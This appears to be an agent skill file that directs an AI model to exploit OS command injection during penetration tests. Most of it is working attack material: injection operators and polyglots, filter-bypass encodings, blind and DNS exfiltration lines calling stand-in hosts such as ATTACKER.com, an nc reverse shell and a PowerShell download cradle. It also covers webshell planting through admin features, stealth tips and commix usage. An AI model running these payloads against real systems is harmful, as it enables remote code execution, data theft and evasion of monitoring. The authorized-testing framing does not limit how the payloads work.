---
name: command-injection
description: >
  Guide OS command injection exploitation during authorized penetration
  testing.
keywords:
  - command injection
  - OS injection
  - RCE via shell
  - shell injection
  - system() injection
  - exec() injection
  - ping injection
  - backtick injection
  - command execution
  - blind command injection
  - argument injection
  - parameter injection
tools:
  - burpsuite
  - commix
  - interactsh
opsec: medium
---

# OS Command Injection

You are helping a penetration tester exploit OS command injection. The target
application passes user-controlled input to a system shell command without proper
sanitization. The goal is to execute arbitrary commands on the underlying
operating system. All testing is under explicit written authorization.

**Not Python eval()/exec() injection.** This skill covers injection into OS
shell commands (bash, cmd.exe, PowerShell) via operators like `;`, `|`, `&&`,
backticks, and `$()`. If the injection context is a Python eval() or exec()
call — where you need to write Python expressions, not shell commands — route
to **python-code-injection** instead. Key indicator: shell operators (`;id`,
`|id`) don't work, but Python expressions (`__import__('os').popen('id')`) do.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[command-injection] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- An input that gets processed by a system command (URL param, form field, header,
  filename, API parameter)
- Common vulnerable patterns: ping/traceroute utilities, DNS lookups, file
  operations, PDF generators, image processors, email sending, network tools

## Step 1: Assess

If not already provided, determine:
1. **Platform** — Linux or Windows (try both `id` and `whoami`)
2. **Injection context** — unquoted, single-quoted, double-quoted, or backtick
3. **Injection point** — which parameter, GET/POST/header/filename
4. **Visible or blind** — is command output reflected in the response?

Skip if context was already provided.

## Step 2: Injection Operators

Try these operators to chain a second command. Test with a known-output command
(`id` on Linux, `whoami` on Windows) or a time delay (`sleep 5`, `ping -c 5
127.0.0.1`).

### Linux

| Payload | Behavior |
|---|---|
| `; id` | Sequential execution (always runs) |
| `| id` | Pipe — runs `id`, shows its output |
| `|| id` | Runs `id` only if first command fails |
| `&& id` | Runs `id` only if first command succeeds |
| `& id` | Background first command, run `id` |
| `` `id` `` | Command substitution (backticks) |
| `$(id)` | Command substitution (modern) |
| `%0a id` | Newline injection |

### Windows

| Payload | Behavior |
|---|---|
| `& whoami` | Run both commands |
| `&& whoami` | Run `whoami` if first succeeds |
| `|| whoami` | Run `whoami` if first fails |
| `| whoami` | Pipe output |
| `%0a whoami` | Newline injection |
| `%1a whoami` | Substitute character (sometimes works) |

### Context-Aware Injection

If the input is placed inside quotes in the shell command:

```bash
# Inside double quotes — break out:
"; id; echo "
" | id; echo "
"$(id)"

# Inside single quotes — cannot use $() or backticks:
'; id; echo '

# Inside backticks — close and inject:
`; id; echo `
```

### Polyglot Payloads

Work across multiple quoting contexts (unquoted, single-quoted, double-quoted):

```bash
# Time-based polyglot
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Comprehensive polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## Step 3: Filter Bypass

### Bypass Space Filters

```bash
# ${IFS} — most reliable
cat${IFS}/etc/passwd
ls${IFS}-la

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/tmp}

# Tab character (URL-encode as %09)
;cat%09/etc/passwd

# Input redirection
cat</etc/passwd

# ANSI-C quoting
X=$'cat\x20/etc/passwd'&&$X
```

### Bypass Command Blacklists

```bash
# Quote splitting — insert empty quotes anywhere in the command
w'h'o'am'i
w"h"o"am"i
/b'i'n/c'a't /e't'c/p'a's's'w'd

# Backslash escaping
w\ho\am\i
c\at /e\tc/p\as\sw\d
/\b\i\n/\s\h

# Empty variable expansion
who$@ami
who${x}ami
cat$u /etc$u/passwd$u

# Empty command substitution
who$()ami
who``ami

# Variable concatenation
a=who;b=ami;$a$b
a=c;b=at;c=/etc/passwd;$a$b $c
```

### Bypass Character Restrictions

```bash
# Hex encoding
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
X=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $X

# Octal encoding
cat `printf '\57\145\164\143\57\160\141\163\163\167\144'`

# xxd for hex decoding
cat `xxd -r -ps <(echo 2f6574632f706173737764)`

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Build slash from env variable
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

### Wildcard-Based Bypass

When specific commands or paths are blacklisted:

```bash
# /bin/cat /etc/passwd via wildcards
/???/??t /???/p??s??

# /bin/nc with wildcard
/???/n? -e /???/s? attacker.com 4444

# Globbing alternatives
/bi[n]/cat /etc/pa[s]swd
/bin/ca? /etc/passw?
```

### Newline and Whitespace Injection

```bash
# URL-encoded newline (most commonly missed by filters)
%0aid
%0awhoami

# CRLF
%0d%0aid

# Backslash-newline continuation (split command across lines)
cat /et\
c/pa\
sswd
# URL-encoded: cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Step 4: Blind Command Injection

When command output is not reflected in the response.

### Time-Based Detection

```bash
# Linux
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Windows
& ping -n 6 127.0.0.1 &
& timeout /t 5 &

# With ${IFS} for space bypass
;sleep${IFS}5
```

If a 5-second delay is observed, injection is confirmed.

### Time-Based Data Exfiltration

Extract data character by character using conditional sleeps:

```bash
# Extract first character of whoami output
if [ $(whoami | cut -c 1) == "r" ]; then sleep 5; fi

# Extract Nth character
if [ $(whoami | cut -c 2) == "o" ]; then sleep 5; fi

# Binary search for faster extraction
if [ $(cat /etc/passwd | head -1 | cut -c 1 | od -An -td1 | tr -d ' ') -gt 100 ]; then sleep 5; fi
```

### DNS-Based Exfiltration (OOB)

Faster than time-based. Requires a DNS callback server (interactsh,
Burp Collaborator, dnsbin.zhack.ca).

```bash
# Exfiltrate command output via DNS
$(host $(whoami).ATTACKER.com)
$(dig $(whoami).ATTACKER.com)
$(ping -c1 $(whoami).ATTACKER.com)

# Exfiltrate file listing
for i in $(ls /); do host "$i.ATTACKER.com"; done

# Exfiltrate file contents (base32 to avoid DNS char restrictions)
$(cat /etc/hostname | base32 | tr -d '=' | nslookup -.ATTACKER.com)

# curl/wget OOB
$(curl http://ATTACKER.com/$(whoami))
$(wget http://ATTACKER.com/$(id|base64) -O /dev/null)
```

### File-Based Exfiltration

Write output to a web-accessible file:

```bash
# Write to webroot
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/out.txt

# Then retrieve via HTTP
curl http://TARGET/output.txt
```

## Step 5: Argument Injection

When shell metacharacters (`;`, `|`, etc.) are properly escaped but the input is
used as an argument to a program. Inject flags/options instead.

### Common Vectors

```bash
# curl — write to arbitrary file
--output /tmp/shell.php -O http://attacker.com/shell.php

# wget — write to arbitrary file
-O /tmp/shell.php http://attacker.com/shell.php

# ssh — proxy command execution
-oProxyCommand="id > /tmp/proof"

# tar — checkpoint action
--checkpoint=1 --checkpoint-action=exec=id

# find — exec action (if input is used in -name or -path)
-name "x" -exec id \;

# rsync — script execution
-e 'sh -c id' .

# sendmail — write to file
-OQueueDirectory=/tmp -X/var/www/html/shell.php
```

### Fullwidth Character Bypass

Some sanitization functions (PHP `escapeshellarg`) can be bypassed with Unicode
fullwidth characters that get normalized by the shell:

```
＂ --use-askpass=calc ＂    # U+FF02 instead of regular double quote
```

## Step 6: Windows-Specific Techniques

### Case Insensitivity

Windows commands are case-insensitive — use case randomization to bypass filters:

```cmd
WhOaMi
wHoAmI
```

### Variable Substring Bypass

```cmd
# Space from environment variable
ping%CommonProgramFiles:~10,-18%127.0.0.1

# Build commands from substrings
set a=who&set b=ami&call %a%%b%
```

### PowerShell Injection

```powershell
# If input reaches PowerShell
; Invoke-Expression "whoami"
| IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
```

### Caret Escaping

Windows `cmd.exe` treats `^` as an escape character:

```cmd
w^h^o^a^m^i
n^e^t u^s^e^r
```

## Step 7: Application-Feature Command Execution

When you have admin/superadmin access to a web application, look for
**legitimate features that execute system commands** — these aren't injection
bugs, they're intended functionality you can abuse.

Common patterns:
- **Filter/rule systems with execute actions** — monitoring tools (Nagios,
  Zabbix, Icinga), CI/CD systems, SIEM platforms. Look for fields named
  "execute command", "run script", "action command", "notification command".
  These often run via background daemons (cron-like), not inline — you may
  need to wait for the daemon cycle or trigger an event.
- **Scheduled tasks / cron features** — CMS platforms, admin panels, backup
  tools. Create or edit a scheduled job with a reverse shell payload.
- **Plugin/extension installation** — WordPress, Joomla, Grafana. Upload a
  malicious plugin ZIP containing a webshell or reverse shell.
- **Template/theme editing** — CMS template editors that write PHP/Python/Ruby
  directly to disk. Edit a template to include command execution.
- **Backup/restore with code execution** — restore a crafted backup containing
  a webshell or modified config that executes commands.
- **Notification/webhook systems** — set a command-based notification triggered
  by an event you can create.

**Key difference from injection:** You're not breaking out of a command — you're
providing the entire command to a feature designed to run it. No operators or
escaping needed, just a valid shell command.

**Trigger mechanisms:** Background daemon features (filters, notifications) may
require an event to fire. Check how to create or simulate the triggering
condition (create a matching record, force an alarm, trigger a threshold).

## Step 8: Escalate or Pivot

### Credential-Based Access Handoff

When command injection reveals credentials (`.env` files, config files, SSH
keys, database connection strings), do NOT attempt to use them programmatically
from the injection context:

- **Do NOT** try `sshpass`, SSH key injection, or automated SSH from injection
- **Do NOT** spend turns debugging interactive authentication workarounds

Instead, immediately write a handoff script for the operator:

1. Save discovered credentials to `engagement/evidence/`
2. Write connection commands the operator can run
3. Report in your return summary: credentials and Pivot Map entry
4. Tell the operator: "Credentials found. SSH handoff ready — connect from
   your terminal."

The operator establishes the interactive session. The orchestrator or operator
decides the next skill to invoke.

## OPSEC Notes

- Commands execute as OS processes — visible in `ps`, `/proc`, process monitors
- Shell operators (`;`, `|`, `&&`) appear in web server access logs
- DNS exfiltration generates DNS queries visible to network monitoring
- Time-based payloads (`sleep`) are slow but stealthy
- `%0a` (newline) injection is less commonly filtered and logged than `;` or `|`
- Long-running commands may trigger process monitoring alerts — use `nohup` and
  background with `&`
- Cleanup: remove any files written to disk (webshells, output files)

## Troubleshooting

### No Operator Works

- Try all operators systematically: `;`, `|`, `||`, `&&`, `&`, `%0a`, `$(...)`,
  backticks
- Check if you're inside quotes — break out first (`"`, `'`)
- Try URL-encoded newline `%0a` — most commonly missed by filters
- Check for argument injection instead (inject flags, not commands)
- The application may not use a shell at all (e.g., `execFile()` in Node.js
  instead of `exec()`) — argument injection is the only option

### Space Is Filtered

Priority order:
1. `${IFS}` — works in bash/sh, most reliable
2. `%09` (tab) — works in most shells
3. `{command,arg1,arg2}` — brace expansion (bash only)
4. `<` (input redirection) — for file reading
5. `$'\x20'` — ANSI-C quoting

### Command Name Is Blacklisted

Priority order:
1. Quote splitting: `c'a't`, `w"h"o"a"m"i"`
2. Backslash: `c\at`, `w\hoam\i`
3. Variable expansion: `a=c;b=at;$a$b`
4. Wildcards: `/???/??t` matches `/bin/cat`
5. Base64: `echo Y2F0 | base64 -d` → `cat`
6. Hex: `echo -e "\x63\x61\x74"` → `cat`

### Blind Injection — Can't Confirm

1. Start with time-based: `; sleep 5` — compare response times
2. If `sleep` is blocked, try `ping -c 5 127.0.0.1` (5-second delay)
3. If time-based is unreliable, use OOB: `$(curl http://ATTACKER/test)`
4. If no outbound HTTP, try DNS: `$(host test.ATTACKER.com)`
5. If completely isolated, try file write: `; id > /tmp/test.txt` and include
   via LFI

### Automated Tools

```bash
# commix — automated command injection
python commix.py -u "http://TARGET/page?ip=127.0.0.1" --batch

# commix with POST data
python commix.py -u "http://TARGET/page" --data="ip=127.0.0.1" --batch

# commix OS shell
python commix.py -u "http://TARGET/page?ip=127.0.0.1" --os-shell

# With specific technique
python commix.py -u "http://TARGET/page?ip=127.0.0.1" -t time-based
```
